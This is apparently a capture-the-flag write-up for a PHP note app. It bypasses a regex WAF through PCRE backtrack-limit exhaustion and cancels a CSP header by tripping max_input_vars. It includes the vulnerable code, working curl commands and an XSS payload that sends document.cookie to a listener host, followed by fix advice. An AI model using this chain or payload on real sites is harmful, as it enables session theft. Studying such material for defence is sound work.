# 04 — When Security Features Make You Less Secure — Writeup

## TL;DR

`notes.lab` reflects `?xss=` but is guarded by (1) a regex WAF and (2) a strict
`Content-Security-Policy: default-src 'none'`. Both are defeated in a single
request. A long, padded note makes the WAF's greedy regex exceed
`pcre.backtrack_limit`, so `preg_match()` returns **`false`** and the
`if (preg_match(...)) block()` filter fails *open*. Appending >1000 GET
parameters trips `max_input_vars`, which makes PHP print a startup **Warning
before the script runs**; that early output makes the later `header("Content-
Security-Policy: ...")` fail with *"headers already sent"*, so the CSP is never
sent and the reflected XSS runs. The admin bot (a real headless Chromium)
carries the flag in a cookie; the XSS exfiltrates it.

Flag: `PHRACK{preg_match_said_false_and_the_csp_never_shipped}`

## The bug

The whole app is `challenge/src/index.php`. Two defences, both correct-looking:

```php
$xss = isset($_GET['xss']) ? $_GET['xss'] : '';

$WAF = array(
    // R1 -- any tag carrying an inline event handler
    '/<\s*[a-z][a-z0-9]*(?:[^>]|\s)*?\son[a-z]+\s*=/i',
    // R2 -- <script> and script-bearing URI schemes
    '/<\s*\/?\s*script\b|javascript\s*:|data\s*:\s*text\s*\/\s*html/i',
);
foreach ($WAF as $i => $rule) {
    if (preg_match($rule, $xss)) {        // <-- bug #1
        http_response_code(403);
        exit('blocked by WAF rule #' . ($i + 1));
    }
}

header("Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'");
// ... HTML ...
echo $xss;                                 // reflected, unescaped
```

### Bug #1 — `preg_match()` has three return values

`preg_match()` returns `1` (match), `0` (no match), or **`false`** (the regex
did not run to completion). It returns `false` when PCRE aborts — for example on
`PREG_BACKTRACK_LIMIT_ERROR`, controlled by the ini directive
`pcre.backtrack_limit` (default **1000000**). That limit was added as a
ReDoS/backtracking safety valve. But the filter treats the return value as a
boolean:

```php
if (preg_match($rule, $xss)) { block(); }
```

`false` is falsy, so *"the regex was too expensive to evaluate"* is read as
*"the input is clean"*. **Fail-open.** Rule R1 is deliberately catastrophic: the
`(?:[^>]|\s)*?` sub-pattern can match a space either through `[^>]` or through
`\s`, so a run of spaces after a tag name explodes into exponential backtracking.

Evidence — the same regex on a clean vs. padded input (run under the lab ini):

```text
clean   => ret=1       last_error=0 (No error)
padded  => ret=false   last_error=2 (Backtrack limit exhausted)
PREG_BACKTRACK_LIMIT_ERROR = 2
```

`<b` + ~24 spaces already blows the default 1000000 budget; the exploit uses 200
spaces for a comfortable margin. (We surface `preg_last_error()` *here in the
writeup* — the vulnerable app never calls it, which is exactly the mistake.)

Rule R2 is a plain linear alternation, so it evaluates fine and returns `0` (no
match) for our payload — it has no `script`, `javascript:` or `data:text/html`.
Only R1 needs the backtracking bypass.

### Bug #2 — a warning before the first line cancels the CSP

`header()` can only set response headers before the body starts. From the PHP
manual: *"header() must be called before any actual output is sent."* Normally
you trigger this with stray output inside the script. pilvar's insight [20] is
that you can make PHP emit output **before the script is even parsed**, using a
*request-startup* warning — and the perfect trigger is `max_input_vars`.

`max_input_vars` (default **1000**) was introduced as the fix for the 2011
hash-collision DoS (Klink & Wälde, 28C3 [19]; PHP bug #60623 / CVE-2011-4885):
too many POST/GET keys could be made to collide in PHP's hashtable and burn CPU.
The cap limits how many input variables PHP will register. When you exceed it,
PHP — *during request startup, before your script runs* — prints:

```text
Warning: PHP Request Startup: Input variables exceeded 1000.
To increase the limit change max_input_vars in php.ini. in Unknown on line 0
```

Because `display_errors=On`, `display_startup_errors=On`, `html_errors=On` and
`output_buffering=0`, that warning is written to the response body
immediately. Only some of those are defaults: `php:8.2-apache` ships **no**
`php.ini` at all, so `display_errors`, `display_startup_errors` and
`output_buffering=0` are the compiled-in no-ini values, while `html_errors=On`
is set by this lab. Watch `output_buffering` in particular — the bundled
`php.ini-development` sets it to **4096**, and with a 4 KiB buffer the startup
warning is held back, `header()` still succeeds, the CSP ships and the whole
technique fails. By the time
`index.php` reaches `header("Content-Security-Policy: ...")`, the body has
already begun, so every `header()` call fails:

```text
Warning: Cannot modify header information - headers already sent by
(output started at Unknown:0) in /var/www/html/index.php on line 37
```

The CSP header is silently dropped. The `default-src 'none'` that was the only
thing stopping the reflected XSS from executing is simply not there.

### Why the exact version/ini matters

* Image: **`php:8.2.33-apache`** (mod_php, Apache 2.4).
* `challenge/php.ini` pins the relevant directives to the image's development
  defaults so the lab is deterministic on any host:
  * `display_errors=On`, `display_startup_errors=On`, `html_errors=On`,
    `error_reporting=E_ALL`, `output_buffering=0` — required for the startup
    warning to reach the client *and* to break `header()`.
  * `max_input_vars=1000` — the threshold to cross for bug #2.
  * `pcre.backtrack_limit=1000000` — the budget to exhaust for bug #1.

Verified defaults straight from the base image (`php -i`): `display_errors =>
STDOUT`, `display_startup_errors => On`, `html_errors => Off`,
`max_input_vars => 1000`, `pcre.backtrack_limit => 1000000`. Note `html_errors`
is **Off** by default in this image, in both SAPIs. This lab sets it
explicitly so the `<b>...</b>`-wrapped warning is reproduced exactly
regardless of host. The bypass works with `html_errors=Off` too — the output
is simply not wrapped in tags; what matters is only that *something* is
written before the headers.

## Building the exploit

### Step 1 — beat the WAF alone

Naive payload is blocked (R1 matches, returns `1`):

```console
$ curl -s -o /dev/null -w '%{http_code}\n' \
    --get --data-urlencode 'xss=<svg onload=alert(1)>' http://127.0.0.1:8004/
403
```

Pad the tag so R1 blows the backtrack limit (`preg_match` → `false` → not
blocked). The response is now 200 and the note is reflected — but the CSP is
still there, so nothing executes yet:

```console
$ curl -s -i --get \
    --data-urlencode 'xss=<b                        ><svg onload=alert(1)>' \
    http://127.0.0.1:8004/ | grep -i 'HTTP/\|content-security'
HTTP/1.1 200 OK
Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'
```

### Step 2 — cancel the CSP alone

Append >1000 parameters. PHP prints the startup warning first, then all
`header()` calls fail, and no CSP header is emitted:

```console
$ curl -s -i "http://127.0.0.1:8004/?xss=hi$(printf '&a=%d' $(seq 1100))" \
    | sed -n '1,12p'
HTTP/1.1 200 OK
...
<br /><b>Warning</b>:  PHP Request Startup: Input variables exceeded 1000...
<br /><b>Warning</b>:  Cannot modify header information - headers already sent...
```

(No `Content-Security-Policy` line in the response headers.)

### Step 3 — ordering gotcha

`max_input_vars` keeps the **first** 1000 variables and drops the rest. If `xss`
is parameter #1002 it is discarded and never reflected. So `xss=` must come
**first**, followed by the ~1100 junk parameters:

```
http://challenge/?xss=<PADDED_PAYLOAD>&a=0&a=1&...&a=1099
```

### Step 4 — chain + exfil

Combined request: WAF bypassed (regex `false`) **and** no CSP header, payload
reflected unescaped:

```console
[solve] direct fetch: status=200 csp=None
[solve] payload reflected unescaped: True
[solve] startup warning present: True
```

The XSS is `<svg onload=fetch('http://solver:9999/?c='+encodeURIComponent(
document.cookie))>`. `<svg onload>` fires on HTML parse, and with no CSP the
`fetch()` to the solver's listener is allowed. We report
`http://challenge/?xss=...` to the admin bot; its headless Chromium opens the
page with the flag cookie set for the `http://challenge` origin, the payload
runs, and the cookie lands on our socket.

## The exploit

`solve/solve.py` (Python 3 stdlib only). Stages:

1. **Wait** for the challenge (`/`) and the bot (`/health`).
2. **Build** the URL: `<b` + 200 spaces + `>` (backtrack bomb) → `<svg onload=
   fetch(...)>` → then `&a=0..1099` (trip `max_input_vars`), with `xss` first.
3. **Sanity-check** by fetching the same query directly against the challenge and
   asserting `csp is None` *and* the payload is reflected — independent proof
   both primitives fired, before the bot is even involved.
4. **Bind** a raw TCP exfil listener on `0.0.0.0:9999`. The bot's browser reaches
   it via the solver's network alias `solver` (compose `--use-aliases`).
5. **Report** the URL to `http://bot:8080/report` and poll the listener. The loop
   re-reports until a hit arrives or ~150s elapse (headless-browser labs are
   flaky; the retry makes it deterministic).
6. **Parse** `PHRACK{...}` out of the captured query string, print
   `FLAG: PHRACK{...}`.

The admin bot (`bot/bot.py`) is a real **headless Chromium 124** on Alpine
(`zenika/alpine-chrome:124`). It launches Chromium with
`--remote-debugging-port`, drives it over the Chrome DevTools Protocol using a
hand-rolled stdlib WebSocket client, sets the flag cookie via `Network.setCookie`
scoped to `http://challenge/`, navigates to the reported URL, and waits for the
page's `onload` to fire. It only accepts URLs whose origin is `http://challenge`.

## Fixing it

* **WAF:** never trust a regex as an allow/deny oracle. Check the return value
  explicitly — `if (preg_match($re,$in) !== 0) block();` treats `false` as an
  error to reject, not to pass. Better: don't filter with regex at all; **encode
  on output** — `echo htmlspecialchars($xss, ENT_QUOTES);`. Also raise/verify
  `pcre.backtrack_limit` and prefer non-catastrophic patterns (possessive
  quantifiers / atomic groups).
* **CSP:** don't rely on `header()` succeeding. Turn `display_errors` **off** in
  production (`log_errors=On` instead), enable `output_buffering`, and/or set
  security headers at the web-server layer (Apache `Header always set`, nginx
  `add_header`) so PHP output can't cancel them. Verify with
  `headers_sent()`/`http_response_code()` and treat a failed `header()` as fatal.
* Defence-in-depth only works if each layer is independent. Here both layers
  were undone by *other* security features (the ReDoS and DoS mitigations);
  output escaping is the layer that would actually have held.

## Going further

* pilvar's slides [20] enumerate other pre-script warnings usable the same way
  (e.g. `$_FILES` capped at 20 by `max_file_uploads`), and the SekaiCTF 2023
  *leakless note* / OpenECSC *Huzzaa* challenges that used this in anger.
* Try tightening the WAF regex and finding a shorter backtracking trigger, or
  swap R1 for a pattern with an atomic group and see the bypass disappear.
* Combine with a header-injection or cache-poisoning primitive where cancelling
  a security header has a wider blast radius.

## References

* Orange Tsai, *"The Art of PHP — My CTF Journey and Untold Stories!"*, Phrack
  #72, §1.2. https://phrack.org/issues/72
* [19] Alexander "alech" Klink, Julian "zeri" Wälde, *"Efficient Denial of
  Service Attacks on Web Application Platforms"*, 28C3 (2011). (The hash-collision
  DoS that motivated `max_input_vars`; PHP bug #60623 / CVE-2011-4885.)
* [20] Philippe "pilvar" Dourassov, *"Secret Web Hacking Knowledge — CTF authors
  hate these simple tricks"*, Insomni'hack 2024, ~p.144.
  https://download.scrt.ch/insomnihack/ins24-slides/Secret_web_hacking_knowledge.pdf
* PHP manual — `preg_match()` return values and `preg_last_error()`;
  `header()` ("must be called before any actual output is sent").
